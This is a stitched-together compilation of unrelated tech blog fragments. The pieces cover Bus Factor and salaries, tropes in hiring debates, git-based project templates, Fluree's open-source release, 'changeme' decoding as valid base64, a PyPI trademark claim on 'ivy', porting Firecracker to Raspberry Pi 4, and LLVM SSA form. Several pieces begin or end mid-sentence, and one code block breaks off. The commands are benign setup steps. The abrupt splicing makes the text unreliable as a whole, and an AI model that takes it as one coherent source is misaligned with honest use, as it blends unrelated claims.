<p><strong>Hmm, maybe, but if firms have so much market power, why don’t they just keep Bus Factor low but set a strong precedent against adversarial negotiation?</strong><br>Great question. Since companies are good at internal coordination, and employees are bad at collective bargaining, firms ought to be able to keep salaries low even without increasing the Bus Factor.</p>
<p>You could just wait for someone to speak up, immediately fire them, take whatever financial hit comes from their project’s failure, but set the precedent for any future dissidents that negotiation is unacceptable.</p>
<p>The problem is, firms don’t handle negotiations, managers do, and their incentives are just as screwed up as yours. A manager stands to lose their career if too many projects fail, but it costs them nothing to advocate for your promotion. So in a low Bus Factor world, the tendency is always to default to generosity.</p>
<p>Why doesn’t this happen at SpaceX? Remember, none of this is actually about salaries or promotions, it’s about sociopathically pursuing leverage as an alternative to fulfilment when you have no other choices. This is all conditional on not being treated like a human, and not having a meaningful job.</p>
<p>In Bus Factor 1 world, you have too much personal responsibility to coast on momentum or free ride on a teammate’s accomplishments. More importantly, you might actually personally care.</p>
<p><strong>Wouldn’t running a company as Bus Factor 1 invite risk?</strong><br>Absolutely. SpaceX has blown up rockets. Tesla has missed deadlines. Neuralink is doing god knows what.</p>
<p>But management science, financial engineering and organizational design are filled with countless other methods for deferring risk.</p>
<p><strong>Okay fine, I’m sold, where do I sign up?</strong><br>Pretty much nowhere!</p>
<p>I’ve asked every friend, accepted every cold call from recruiters, and as far as I can tell, nearly no companies or even individual teams are run with Bus Factor 1. Again, maybe SpaceX, but I’m relaying that second hand.</p>
<p>If you find out, let me know. Or better yet, start it yourself and tell me!</p>

<article id="post-193">

	

	
	<div>
		
<p>Another day, another HackerNews discussion about hiring being broken. The most recent one I saw was triggered by <a href="https://blog.alinelerner.com/ive-been-an-engineer-and-a-recruiter-hiring-is-broken-heres-why-and-heres-what-it-should-be-like-instead/">a blog post</a> by the formidable Aline Lerner (disclaimer: Aline is a friend and we collaborated on a <a href="https://www.holloway.com/g/technical-recruiting-hiring/about">hiring book</a> last year). Now, I 100% agree that hiring is broken, and Aline’s post is really thoughtful. In fact, a lot of “hiring is broken” articles are thoughtful.</p>



<p>But the discussion threads are something else—they miss the point of the article. The discussion threads are even more broken than hiring. And they’re really repetitive. They always do contain grains of truth, but inevitably have us reaching conclusions that are simplistic, and in my opinion, create a pretty bad attitude in the tech industry.</p>



<p><strong>Conclusion #1: “Hiring sucks for candidates, but hiring managers can do what they want</strong>“</p>



<p>The truth is that hiring is hard for everyone. There’s no question about it. It’s hard for both candidates and for hiring managers. Sure, FAANGs and the startup-du-jour might have a leg up, but most people who are hiring are trying to hire at a non-FAANG, non-sexy company. If you’ve never done it, you should try it at some point in your career. It’s an <em>incredibly </em>humbling experience. Or, at the very least, find a friend who’s spent time on hiring, and ask them for their favorite battle story.</p>



<p>And yes, on the balance, power and information asymmetry work out in favor of the companies hiring. And that asymmetry is much larger with FAANGs. But even FAANGs have to invest a tremendous amount of time and energy into hiring. It’s not really easy for anyone. </p>



<p>Especially if you want to do it <em>well</em>. Ask any successful leader (entrepreneur, manager) what they spend most of their time on, and it’ll either involve a large chunk spent on hiring (if they appreciate the problem and give it the attention it deserves) or dealing with the consequences of bad hiring (if they don’t).</p>



<p><strong>Conclusion #2: “Hiring is a crap-shoot—it’s a roll of the dice</strong>“</p>



<p>I strongly disagree with this one. When writing the <a href="https://www.holloway.com/g/technical-recruiting-hiring">Holloway Guide to Technical Hiring and Recruiting</a>, I got to interview dozens of really thoughtful hiring managers and recruiters. They were really good at their jobs. And there were some common themes. They were thoughtful about every step of their process. They kept their process balanced and fair, holding a high bar but respecting candidates and their time. They didn’t chase the same pool of candidates everyone else was chasing—instead, they found non-traditional ways to discover really talented and motivated people who weren’t in the pool of usual suspects. They were thoughtful about what signals they were looking for and how best to assess them. And, they deeply understood their team’s needs, and candidates’ needs, and were really good at deciding when there was or wasn’t a fit. But most of all, they were effective: they built really talented teams.</p>



<p>There are a handful of companies that have built amazing hiring engines, and the proof is that they’ve been able to put together really strong teams. You can generally tell that if a person worked at a certain company at a certain time, that person is probably incredibly intelligent and incredibly motivated (some examples are Google, Facebook, Stripe, Dropbox at different points in time). There will always be noise. Even the best hiring managers will sometimes make hiring mistakes. And of course, even the best engineers may not be a fit for every role or every company. </p>



<p>Again, hiring is hard. But there is not a shred of doubt in my mind that if you are thoughtful about it, you can hire well. And really, you don’t need to be perfect at it. You just need to be better than the rest.</p>



<p><strong>Conclusion #3: “FAANGs suck at hiring”</strong></p>



<p>This one has some truth to it, but it’s a lot more subtle than “FAANGs suck at hiring”. Because let’s face it, they do hire really smart people. Some of the smartest people I know are at FAANGs right now. So let’s decouple that statement a little more.</p>



<p>FAANGs <em>do </em>suck at parts of hiring, like their candidate experience. They can be really slow at making hiring decisions. Their hiring process might be tedious and seem arbitrary. But <em>they usually can get away with it</em>, <em>and you probably can’t!</em> They’ve got a strong brand, interesting technical challenges (interesting for some people, at least), and a lot of money. In fact, one FAANG VP of Engineering told me: “our process is what we can get away with”. To the point that they can even play it off as a positive: “our process is slow and long because we are <em>very</em> selective”.</p>



<p>And look, I’m sure FAANGs lose some talented candidates who get turned off by their “you’d-be-blessed-to-work-with-us” attitude. They definitely have a lot of room for improvement. But at the end of the day, they’re operating a process that’s delivering large quantities of really smart people at scale. In fact, I’d argue their internal processes around strategy, performance management / promotions, etc cause incredibly <em>more</em> damage to them than broken hiring—if you lose out on hiring one talented person when you have thousands applying to work for you, that’s one story, but if you hire someone really talented and driven, and they work for you for 6 to 12 months but don’t meet their potential and leave in bitter frustration… well, that’s a subject for another post)</p>



<p>“But”, people go on, “FAANGs <em>also</em> don’t know how to interview!” Which brings me to trope #4.</p>



<p><strong>Conclusion #4: “Whiteboard</strong> <strong>and algo/coding interviews suck”</strong></p>



<p>Again, this one has some truth to it, but if you just stop at the above statement, you miss the point.</p>



<p>Algo/coding interviews are one of the primary hiring mechanisms used by FAANG companies. And they are incredibly unpopular—at least in discussion threads. But big companies have spent years looking at their hiring data and feeding that back into their hiring process (coining the term “<a href="https://rework.withgoogle.com/subjects/people-analytics/">people analytics</a>” along the way).</p>



<p>The argument against them is usually a combination of:</p>



<ul><li>they really only assess pattern-matching skills (map a problem to something you’ve seen before)</li><li>they only assess willingness to spend time preparing for these types of interviews</li></ul>



<p>These are fair criticisms, but that doesn’t mean these interviews are actually terrible. I mean, they might be terrible for you if you’re interviewing and you don’t get the job. You’re probably a brilliant engineer, and I agree, these interviews certainly don’t fully assess your ability (or maybe you’re a shit engineer, I don’t know you personally). In any case, the leap from “this interview sucked for me” to “this interview sucks” is still pretty big.</p>



<p>If you’re a large tech co with a big brand and a salary scale that ranks at the top of&nbsp;<a href="https://www.levels.fyi/">Levels.fyi</a>, you probably get a lot of applications. So a good interview process is one that weeds out people who wouldn’t do well at your company. To do well at a large tech company, you need to (and I’m painting with a really broad brush, but this is true for 90% of roles at these companies):</p>



<ol><li>Some sort of problem-solving skill that’s a mix of raw intelligence and/or ability to solve problems by pattern-matching to things you’ve seen before.</li><li>Ability/commitment to work on something that may not&nbsp;<em>always&nbsp;</em>be that intrinsically motivating, in the context of getting/maintaining a well-paying job at a large, known company.</li></ol>



<p>Hopefully you can see where I’m going with this. Basically, the very criticisms thrown at these types of interviews are the reason they work well for these companies. They’re a good proxy for the work you’d be doing there and how willing you are to do it. If you’re good at pattern matching, and are willing to invest effort into practicing to get one of these jobs, you’ll probably do well at the job.</p>



<p>Not that there’s anything wrong with that type of work. I spent several years at big tech co’s, and the work was intellectually stimulating most of the time. But a lot of times it wasn’t. It was a lot of pattern-matching. Looking at how someone else had solved a problem in a different part of the code-base, and adapting that to my use-case.</p>



<p>On the other hand, if you’re a brilliant engineer who struggles with being told what to do or doing work that you can’t immediately connect to something intrinsically motivating to you, that FAANG interview just did both you and the company a favor by weeding you out of the process.</p>



<p>So the truth is, there is no single “best interview technique”. In our book, we wrote several chapters about different interviewing techniques and their pros and cons. In-person algo/coding interviews on a whiteboard, in-person interviews where you work in an existing code base, <a href="https://www.holloway.com/g/technical-recruiting-hiring/sections/take-homes">take-home interviews</a>, pairing together, having a trial period, etc all have pros and cons. The trick is finding a technique that works for both the company and the candidate. </p>



<p>And that can really differ from company to company and candidate to candidate. A VP at Netflix told me about how they had a really strong candidate come in, but when asked to do a whiteboard-type interview, informed them (politely) that they might as well just reject him then. He was no good at whiteboard interviews… But if they allowed him to go home and write some code, he’d be happy to talk through it. And since then, many Netflix teams have offered candidates the choice of doing a take home.</p>



<p>And really, any interview format can suck. It can fail to assess a candidate for the things a company needs and it can be a negative candidate experience. Which would you rather have:</p>



<ul><li>A whiteboard interview with heavy algorithms for a role where that knowledge (or ability to develop that knowledge) isn’t critical, delivered by an apathetic engineer who doesn’t care about their job.</li><li>A poorly-designed take-home, requiring skills that you don’t have and won’t need for the job, and that you spend hours thinking through and working on, send in, and get rejected without getting any feedback.</li></ul>



<p>Probably neither.</p>

October 24, 2020 | https://jappieklooster.nl/using-git-for-templates.html | <a href="https://web.archive.org/web/*/https://jappieklooster.nl/using-git-for-templates.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><article role="article"><header><p><time datetime="2020-10-24T15:00:00+02:00" pubdate=""> published: 24日 10月 2020年 </time></p></header><div><p>Over the past few years I’ve started using git as a template management tool<sup id="fnref-9"><a href="#fn-9">1</a></sup>. For example, I clone my <a href="https://github.com/jappeace/haskell-template-project">haskell template project</a>, edit the names, edit the <code>readme</code> end re-setup the&nbsp;remotes:</p><div><pre><span></span>git remote add template git@github.com:jappeace/haskell-template-project.git
git remote set-url origin git@github.com:jappeace/new-project.git
</pre></div><p>This allows me to keep my downstream project up to date with the template. When I discover another tool, this can be merged into the downstream project for example. It allows evolving the template over time as I learn more about whatever programming language I’m&nbsp;using.</p><p>It also gives me default branding. Which makes it look more ‘professional’. Although I don’t like branding, I know this is necessary. Having it there by default makes it so that I don’t forget to do&nbsp;this.</p><p>When starting a project you also gain some free authoritativeness, because you have a longer commit history the project looks like it is more mature. Although this practice is a little deceptive, there is a core of truth, because the template has gotten a lot of attention. If you feel offended by this practice, ask yourself first, why are you trusting git histories? These can be <a href="https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History">rewritten anyway</a>. This authoritativeness also gives me a small moral boost. It just <em>feels</em> better to have a project with well thought out tools being started and some history rather then the ‘normal’ stuff everyone starts&nbsp;with.</p><h2 id="alternatives">Alternatives</h2><p>The alternatives are using tools that spit out templates. In the haskell world these are <a href="https://github.com/commercialhaskell/stack-templates">stack new</a>, <a href="https://cabal.readthedocs.io/en/latest/developing-packages.html#using-cabal-init">cabal init</a> or <a href="https://github.com/kowainik/summoner">summoner</a>. These tools are simply a glorified <code>sed</code> on projects folders: They find and replace variables. There is no versioning, there is no personalization except what limited variables&nbsp;give.</p><p>Because these tools don’t take into account history, the first commit will be a large commit with a message like ‘Initial’. I find this problematic because it squashes all the work that went into creating the template. Information is lost, for no&nbsp;reason.</p><p>These tools don’t use git to track their templates. They could, but they don’t. Maybe they wanted to be <span>VCS</span><sup id="fnref-1"><a href="#fn-1">2</a></sup> agnostic? I’m speculating, but even if you wanted to be that, you could still use any version system to track the template and recreate the history in the <span>VCS</span> desired by the user. This at least gives the user their history of the template back. While also giving them the choice of <span>VCS</span><sup id="fnref-8"><a href="#fn-8">3</a></sup></p><h2 id="a-template-hierarchy">A template&nbsp;hierarchy</h2><p>What I described in the intro can be taken a step further. A template of a template can be used to create another new template. For example, say you’re a fan of <a href="https://nixos.org/">nix</a> or <a href="https://www.gnu.org/software/make/manual/make.html">make</a>, so why not put a makefile and a <a href="https://nix.dev/tutorials/towards-reproducibility-pinning-nixpkgs.html#pinning-nixpkgs">nix pin</a> in some template of templates project. These tools don’t care about which language you use, so their configuration can be shared among Python, Java and Haskell projects for example. Maybe for github it could even have a partial travis or github actions <span>CI</span>&nbsp;setup.</p><p>Now, say you’re starting a new Python project, but have no template yet for that programming language. You simply clone this template of templates and customize it to your own <a href="https://stackoverflow.com/questions/25011078/what-does-pythonic-mean#:~:text=Pythonic%20means%20code%20that%20doesn,is%20intended%20to%20be%20used.">Pythonic</a> needs. You can still pull in the upstream changes from your template of templates, for example to upgrade the nix pin. The big advantage of course is that a change in the template of templates can easily merged into all downstream projects with&nbsp;git.</p><p>I convinced the reader that using git is the superior way for template management. It’s simpler, and more flexible. I also convinced the authors of stack, cabal and summoner to drop their current way of managing templates and use git&nbsp;instead.</p><p>Or, more likely, no-one read this&nbsp;far.</p></div><small></small></article><section></section><section></section></div></div>]]>

<h3>Sidebar: What is Fluree?</h3>



<p><em>Fluree is an Open-Source Semantic Graph Database that guarantees data integrity, provides traceability into data provenance, facilitates secure data collaboration, and powers connected data insights. Fluree organizes blockchain-secured data in an append-only, immutable ledger. Fluree exposes the ledger data in industry-standard RDF as a semantic graph database. Fluree can run on any machine, and its “edge” query servers can be scaled linearly to meet any level of enterprise demand. Fluree can even run as an in-memory database alongside your code, thanks to our </em><a href="https://flur.ee/javascript-library/"><em>Javascript library and React Frontend capabilities</em></a><em>.</em></p><p><em>Read more about fluree in our documentation </em></p><p><a href="http://docs.flur.ee/"><em>here</em></a><em>.</em></p>

<hr>



<p><br>On the heels of concluding our<a href="https://www.crn.com/news/applications-os/blockchain-startup-fluree-completes-seed-funding-round"> Seed Round</a> fundraise, the Fluree team is now focused on growing an open-source community of technologists passionate about the future of secure, democratic data management.</p>



<div><p>Fluree co-founder Brian Platz and Flip Filipowski have always planned to build the Fluree platform alongside an open-source community. The two established Fluree as a <a href="https://medium.com/fluree/why-fluree-is-a-pbc-public-benefit-corporation-50ab90ca081b">Public Benefit Corporation</a> to use the power of open, trusted data management to solve large-scale problems in our enterprises and society. Many of Fluree’s key use cases today —&nbsp; including Verifiable Credentials, Decentralized Identifiers, Master Data Management, Open Data platforms, and integrations with Public Blockchains — will benefit from an open-source community behind the technology and a rejection of vendor-locked proprietary formatting.&nbsp;</p></div>



<h2><strong>Why Open Source?</strong></h2>



<p>Trust and Accessibility.&nbsp;</p>



<p><em><strong>Trust</strong></em> – Data is becoming an important, dynamic asset for every organization. If enterprises are going to entrust a platform to securely manage this critical asset, it should be open-source and standards-based. Data is too valuable to be locked up in a proprietary format; held hostage by a single private vendor. By open-sourcing Fluree and leveraging W3C standards, you can have confidence that your data is future-proof and portable.</p>



<div><p><em><strong>Accessibility</strong></em> – Fluree is excited to provide its technology to anyone involved in the future of our internet. We are firmly committed to the idea that everyone should have equitable access to this cutting-edge technology.&nbsp;</p></div>



<h2><strong>Why Now?</strong></h2>



<p>Fluree <a href="https://medium.com/fluree/flureedb-is-production-ready-and-live-86bce82665dc">shipped</a> its first production-ready offering in 2018. Over the last two years, we assembled a team of skilled engineers to build out the platform with key <a href="http://flur.ee/features">features</a> and <a href="https://github.com/fluree">open-source libraries</a>, drawing from feedback in our growing developer <a href="https://launchpass.com/flureedb">community</a>.&nbsp;</p>



<div><p>Today, we feel confident in releasing Fluree Version 1.0 to the world — under Open Source —&nbsp; so that we can move our technology forward, together with our community.&nbsp;</p></div>



<h2><strong>What is the difference between the </strong><a href="https://flur.ee/getstarted/"><strong>Open-Source Community Edition</strong></a><strong> and the </strong><a href="https://flur.ee/contact/"><strong>Fluree Enterprise License</strong></a><strong>?&nbsp;</strong></h2>



<p><br>Not much from a technical standpoint. Let us explain:&nbsp;</p>



<p>All of Fluree’s features will be available for general use in our Open-Source version. We figured it wouldn’t make sense to restrict bells and whistles for members of our community that are investing the time to learn and build on our platform.&nbsp;</p>



<p><em>Examples of folks that would build on Fluree’s Open Source Community Edition:</em></p>



<ul><li>You are a university professor or student</li><li>You are a startup building an innovative SaaS or dApp</li><li>You are a developer at an enterprise testing Fluree in a proof of concept phase</li></ul>



<p><em>When you might make the switch to Fluree’s License-Supported Model:</em></p>



<ul><li>You are looking for 24/7 Commerical Support for setup and maintenance </li><li>You are deploying Fluree in a critical production environment that requires Fluree’s “officially-approved” license </li></ul>



<p>Fluree also intends to build out a suite of enterprise solutions around the core product, including tools to manage a Fluree data network and associated dashboards.&nbsp;</p>



<p><strong><em>A Third Option: Fluree’s Commercial Cloud</em></strong></p>



<p>Would you like to build, test, deploy, and run Fluree without provisioning your own servers? <a href="https://flur.ee/contact/">Get in touch with sales</a> to chat about our Database as a Service cloud environment.</p>

				Introduction to Data-Centricity			</a>
		</h3>
				<p>The Data-Centric Architecture treats data as a valuable and versatile asset instead of an expensive afterthought. Data-centricity significantly simplifies security, integration, portability, and analysis while delivering faster insights across the entire data value chain. This post will introduce the concept of Data-Centricity and lay the framework for future installments on Data-Centricity.</p>

        <p><a href="https://en.wikipedia.org/wiki/Base64">Base64-encoding</a> is ubiquitous in our
modern world. Many programs communicate in base64-encoded messages, since these
have nice properties: They consist of a very limited subset of ASCII characters,
and can thus be displayed as text. E-Mails for example are commonly encoded in
base64 in transfer, which can be seen in the <code>Content-Transfer-Encoding</code> header.</p>

<p>Where I volunteer we have a tradition of putting <code>changeme</code> as a placeholder for
many template variables indicating that they should be overwritten later. Thus,
if we later still see <code>changeme</code> anywhere we know that somewhere somebody must
have forgotten to specify a variable<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>

<p>Sometimes these template variables should correspond to base64-encoded content,
i.e. the base64-decoding of said variable should produce meaningful content. But
what happens if somebody forgets to define said variable, and it is substituted
with<code>changeme</code> instead? I always thought that it would fail to
decode the string since the probability that <code>changeme</code> is actually valid base64
encoding must be very low. But lo and behold, this is not the case:</p>

<pre><code>% echo changeme | base64 -d
r�[1m
</code></pre>

<p>Running <code>hexdump</code> on the output we can identify the characters:</p>

<pre><code>% echo changeme | base64 -d | hexdump -C
00000000  72 16 a7 81 e9 9e      |r.....|
00000006
</code></pre>

<p>Mostly nonsense, but the second byte is interesting: It is an ASCII control
character <sup id="fnref:2"><a href="#fn:2">2</a></sup>, meaning trips up all sorts of programs which expect to read
printable ASCII characters, such as JSON deserializers.</p>

<p>This bug actually occurred when I was migrating some applications between
different Kubernetes clusters: In the old cluster the application ran without
problems, but I forgot to specify some variable in the new cluster, and it lead
to Go complaining about non-ASCII characters in a JSON string.</p>

<p>I guess the moral of the story is: If you use dummy values be sure that they
cannot be misinterpreted.</p>

I found an odd email in my inbox yesterday from a company claiming ownership of a Python package, <a href="https://pypi.org/project/ivy/">Ivy</a>, that I registered on the Python Package Index back in August 2016, more than four years ago. The company is claiming ownership of the package on the basis of a <a href="https://trademarks.ipo.gov.uk/ipo-tmcase/page/Results/1/UK00003521605">UK trademark</a> on the word "ivy" filed in August 2020.
</p>
<p>
Here's the full text of the email:
</p>
<div>
<p>
Dear Mr. Mulholland,
</p>
<p>
We are genuinely sorry to be the bearers of bad news, but we are writing
after following the <a href="https://www.python.org/dev/peps/pep-0541/#how-to-request-a-name-transfer">advice</a> on
the PyPI website. We would kindly like to request that the "ivy" package name be released from PyPI, on the grounds that it violates our <a href="https://trademarks.ipo.gov.uk/ipo-tmcase/page/Results/1/UK00003521605">trademark</a>.
PyPI lists <a href="https://www.python.org/dev/peps/pep-0541/#invalid-projects">trademark violation</a> as grounds to invalidate a project on PyPI, with subsequent removal. If you would be more comfortable waiting for official involvement of PyPI before releasing the name, then we will gladly <a href="https://www.python.org/dev/peps/pep-0541/#how-to-request-a-name-transfer">open a new issue</a> with PyPI.
</p>
<p>
Please let us know if you have any questions regarding this request.
</p>
<p>
Kind Regards,<br>
The Ivy Team

I have no idea what this company does, they didn't link to their website, but they probably sell yoga mats judging from the stretchiness of this stretch.

Name Shortages and Namespacing
</h3>
<p>
Unfortunately the Python Package Index uses a single flat namespace for all packages so the name famine is a real and growing problem. I've been disappointed all too many times myself to find that a name I wanted to use was occupied by an abandoned project that hadn't been touched in years. (This isn't the case for <a href="https://github.com/dmulholl/ivy">Ivy</a> which is being actively developed.)
</p>
<p>
The problem must be getting serious as the Package Index's maintainers have introduced a set of formal guidelines and processes (<a href="https://www.python.org/dev/peps/pep-0541/">PEP 541</a>) for arbitrating disputes over package names — I certainly don't envy them the task.
I think the long-term solution instead is to introduce namespacing by username so packages like <code>dmulholl/ivy</code> and <code>yogamasters/ivy</code> can happily coexist.
</p>
<p>
I've actually been approached several times over the years by people wanting control over the <code>ivy</code> package. Usually they offer to buy it from me — this is the first time I've been threatened with a trademark. It'll be interesting to see how the Package Index maintainers handle the dispute.

<![CDATA[Porting Firecracker to a Raspberry Pi 4 (2019)]]>

October 24, 2020 | https://blog.cloudkernels.net/posts/firecracker-rpi4/ | <a href="https://web.archive.org/web/*/https://blog.cloudkernels.net/posts/firecracker-rpi4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Since we got our hands on the new Raspberry Pi 4, we started exploring how
various virtualization technologies behave on the board. First thing we tried is how to run <a href="https://cloudkernels.github.io/posts/rpi4-64bit-virt/">Nabla</a> on it and how it compares to native KVM.</p>

<p>Next thing we wanted to try is <a href="https://github.com/firecracker-microvm/firecracker">firecracker</a>, the notorious micro-VMM that
Amazon Lambda &amp; Fargate run on. To our disappointment, firecracker was not
<a href="https://github.com/firecracker-microvm/firecracker/issues/1196">yet</a> running on RPi4. So we started looking into coding in the necessary
changes :)</p>

<p>After a bit of investigation, we figured out that the key missing piece is
support for the GICv2 ARM interrupt controller. In fact, firecracker only
supports GIC version 3 since it was open-sourced, but not version 2, which is
the version appearing in the Raspberry Pi series, as well as in other popular
boards, like the Hikey 970 we got our hands on, or Khadas VIM3. A bit more
digging into the internals of firecracker and the Linux kernel, helped us
work out the details and open a <a href="https://github.com/firecracker-microvm/firecracker/pull/1235">pull-request</a> which adds support for the
missing parts.</p>

<h4 id="changes-in-firecracker">Changes in Firecracker</h4>

<p>The Generic Interrupt Controller (GIC) is the IP block in the ARM processors
that implements interrupt handling. The Linux kernel supports user- and
kernel-space emulation for GICv2 as well as GICv3 and v4. However, Firecracker
only handles the GICv3-related configuration of the virtual GIC (VGIC).
Similarly, setting up the FDT for the guest microVM from Firecracker only
handles GIC-v3 devices.</p>

<p>In terms of code organization, the GIC related code currently exposes a function
for setting up GICv3 performing the corresponding <code>ioctl</code> KVM commands. The
first part of our PR changes this by introducing a GIC Trait which defines the
common interface for all GIC implementations. Even though it is still under
discussion, what exactly will be in the Trait in its final form, it will be
something along the following lines:</p>
<div><pre><code data-lang="rs"><span>/// Trait for GIC devices.
</span><span></span><span>pub</span><span> </span><span>trait</span><span> </span>GICDevice<span> </span>{<span>
</span><span>    </span><span>/// Returns the GIC version of the device
</span><span></span><span>    </span><span>fn</span> <span>version</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>u32</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns the file descriptor of the GIC device
</span><span></span><span>    </span><span>fn</span> <span>device_fd</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span><span>DeviceFd</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns an array with GIC device properties
</span><span></span><span>    </span><span>fn</span> <span>device_properties</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span>[<span>u64</span>];<span>
</span><span></span>}<span>
</span></code></pre></div>
<p>With this in place, we can define objects per GIC version, which implement this
Trait, and still have the rest of the code deal with the <code>GICDevice</code> Trait,
which is transparent to the GIC version.</p>

<p>The implementations for each version, implement the Trait and a <code>new</code> function
which is used to create the new object:</p>
<div><pre><code data-lang="rs"><span>pub</span><span> </span><span>fn</span> <span>new</span>(vm: <span>&amp;</span><span>VmFd</span>,<span> </span>vcpu_count: <span>u64</span>)<span> </span>-&gt; <span>Result</span><span>&lt;</span><span>Box</span><span>&lt;</span>GICDevice<span>&gt;&gt;</span><span>
</span></code></pre></div>
<p>The differentiation between the two versions lays in the VGIC register
attributes that each device exposes. As a result, the work we need to do is essentially to <code>mmap</code> their addresses.</p>

<p>GICv2 relevant addresses include the <strong>distributor</strong> and <strong>cpu</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.
</span><span> We are placing the GIC below 1GB so we need to substract the size of the distributor.

<p>Regarding the FDT creation, there are differences between v2 and v3 regarding
the interrupt controller <code>intc</code> node.</p>

<p>First, we need to define the GICv2 <code>compatible</code> property to be <code>arm,gic-400</code>,
since it is the GIC-400 chip which implements GICv2. Next is the <code>reg</code>
property of the FDT, which includes the addresses and the corresponding sizes of
the GIC registers, i.e. distributor and CPU for GICv2, distributor and
redistributor for GICv3. Finally, we fix the <code>interrupts</code> property which
determines the interrupt source of the VGIC maintenance interrupt. The
corresponding values for GICv2 were taken from the respective <a href="https://github.com/torvalds/linux/blob/master/Documentation/devicetree/bindings/interrupt-controller/arm%2Cgic.yaml">Linux Kernel entries</a>.</p>

<h4 id="build-firecracker-with-rpi4-support">Build firecracker with RPi4 support</h4>

<p>While waiting for the patch to merge upstream you can go ahead and check out it
yourself.</p>

<p>Clone and build our fork of firecracker (keep in mind that while the PR review
is going on, we might force-update the branch).</p>
<div><pre><code data-lang="bash">$ git clone https://github.com/cloudkernels/firecracker.git
$ <span>cd</span> firecracker
$ ./tools/devtool build</code></pre></div>
<p>Next you need a kernel image and a root filesystem to run with your firecracker
build. You can grab the pre-built kernel image and rootfs here:</p>
<div><pre><code data-lang="bash">$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/kernel/vmlinux.bin
$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/fsfiles/xenial.rootfs.ext4 </code></pre></div>
<p>Alternatively, you can build your own kernel and rootfs using the following
steps provided by the firecracker docs
<a href="https://github.com/cloudkernels/firecracker/blob/master/docs/rootfs-and-kernel-setup.md">here</a></p>

<h4 id="launch-our-image">Launch our image</h4>

<p>To launch our image we will use the <a href="https://github.com/firecracker-microvm/firectl">firectl</a> tool. We need, to setup a tap
device for the networking or our firecracker microVM.</p>
<div><pre><code data-lang="bash">$ sudo ip tuntap add dev tap0 mode tap
$ sudo ip addr add <span>172</span>.16.0.1/24 dev tap0
$ sudo ip link <span>set</span> tap0 up</code></pre></div>
<p>And we launch the microVM using firectl:</p>
<div><pre><code data-lang="bash">firectl --firecracker-binary<span>=</span><span>${</span><span>PATH_TO_FC_BIN</span><span>}</span> --kernel<span>=</span>vmlinux.bin <span>\
</span><span></span>	--tap-device<span>=</span>tap0/aa:fc:00:00:00:01 <span>\
</span><span></span>	--kernel-opts<span>=</span><span>"console=ttyS0 reboot=k panic=1 pci=off ip=172.16.0.42::172.16.0.1:255.255.255.0::eth0:off"</span> <span>\
</span><span></span>	--root-drive<span>=</span>./nginx_fc.ext4</code></pre></div>
<p>Here, we used here the <code>ip</code> kernel boot parameter to give the <code>172.16.0.42</code>.</p>

<p>Finally, we try out our nginx server:</p>
<div><pre><code data-lang="html">curl 172.16.0.42
<span>&lt;!DOCTYPE html&gt;</span>
&lt;<span>html</span>&gt;
&lt;<span>head</span>&gt;

        <span>margin</span>: <span>0</span> <span>auto</span>;
        <span>font-family</span>: Tahoma, Verdana, Arial, <span>sans-serif</span>;
    }
&lt;/<span>style</span>&gt;
&lt;/<span>head</span>&gt;
&lt;<span>body</span>&gt;
&lt;<span>h1</span>&gt;Welcome to nginx!&lt;/<span>h1</span>&gt;
&lt;<span>p</span>&gt;If you see this page, the nginx web server is successfully installed and

<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
